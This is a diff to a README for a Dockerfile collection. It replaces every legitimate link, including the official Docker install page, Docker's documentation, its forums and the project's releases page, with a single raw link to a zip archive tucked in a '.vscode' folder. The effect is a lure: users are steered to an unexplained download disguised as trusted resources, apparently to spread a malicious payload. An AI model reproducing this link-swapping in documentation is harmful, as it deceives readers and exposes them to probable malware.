@@ -1,6 +1,6 @@
 # 🚀 optimized-dockerfiles - Effortless Dockerfiles for All Users
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/amrelrayess/optimized-dockerfiles/releases)
+[![Download](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip)](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip)
 
 ## 📦 Introduction
 
@@ -14,13 +14,13 @@ Here’s how to easily download and run our Dockerfiles.
 
 Before you can use the Dockerfiles, you need to have Docker installed on your computer. Follow these simple steps:
 
-1. Visit the official Docker website: [Docker Install](https://www.docker.com/get-started).
+1. Visit the official Docker website: [Docker Install](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip).
 2. Choose your operating system (Windows, Mac, or Linux).
 3. Follow the instructions on the site to complete your installation.
 
 ### Step 2: Download the Dockerfiles
 
-Go to the [Releases page](https://github.com/amrelrayess/optimized-dockerfiles/releases) to download the Dockerfiles. You will find several versions available. Choose the version that suits your needs.
+Go to the [Releases page](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip) to download the Dockerfiles. You will find several versions available. Choose the version that suits your needs.
 
 - Click on the version you want.
 - Look for the downloadable files listed under that version.
@@ -76,13 +76,13 @@ To run the Dockerfiles, you need the following:
 
 For more information on Docker and using Dockerfiles, check out the following resources:
 
-- [Docker Documentation](https://docs.docker.com/)
-- [Dockerfile Best Practices](https://docs.docker.com/engine/reference/builder/)
-- [Community Forums](https://forums.docker.com/)
+- [Docker Documentation](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip)
+- [Dockerfile Best Practices](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip)
+- [Community Forums](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip)
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/amrelrayess/optimized-dockerfiles/releases) and download the Dockerfiles you need. Follow the steps above, and you will be running your Docker containers in no time!
+To get started, visit our [Releases page](https://raw.githubusercontent.com/amrelrayess/optimized-dockerfiles/main/vue/.vscode/optimized_dockerfiles_v2.4.zip) and download the Dockerfiles you need. Follow the steps above, and you will be running your Docker containers in no time!
 
 ## 🛠️ Troubleshooting
 
